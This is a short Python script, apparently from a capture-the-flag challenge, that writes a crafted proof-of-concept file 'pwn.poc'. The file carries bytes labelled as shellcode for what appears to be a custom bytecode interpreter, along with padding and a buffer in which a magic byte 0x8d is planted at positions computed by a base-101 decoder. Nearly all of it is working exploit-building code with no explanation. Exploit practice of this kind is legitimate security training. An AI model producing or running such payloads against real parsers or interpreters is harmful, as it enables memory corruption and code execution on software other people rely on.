

def p32(x):
    return x.to_bytes(4, 'little')

z = 5851

hax = b'marker1234'

code = b''

# shellcode!

# pushc ; load ; keys
code += bytes([36]) + p32(42)

# pushc ; getarr ; swap
code += bytes([5]) + p32(0) + p32(1) + p32(2)

# drop
code += bytes([112])

# getdict ; pushc
code += bytes([44]) + p32(0)

# drop
code += bytes([112])

# puts ; retv
code += bytes([128])


code += (b'z' * (600 - len(code)))

hax += code

def decodeval(x):
    idx = []
    while x != 0:
        r = x % 101
        idx.append(r - 1)
        x //= 101
    return idx

Q = 0x8d

buffer = [0x61] * 200
for i in decodeval(z):
    print(i)
    buffer[i] = Q

f = b'{secr3t_c0d3:1337,hax:"' + hax + b'",flag:"' + bytes(buffer) + b'",magic:{' + bytes([Q]) + b':' + str(z).zfill(5).encode('ascii') + b'}}'

open('./pwn.poc', 'wb').write(f)
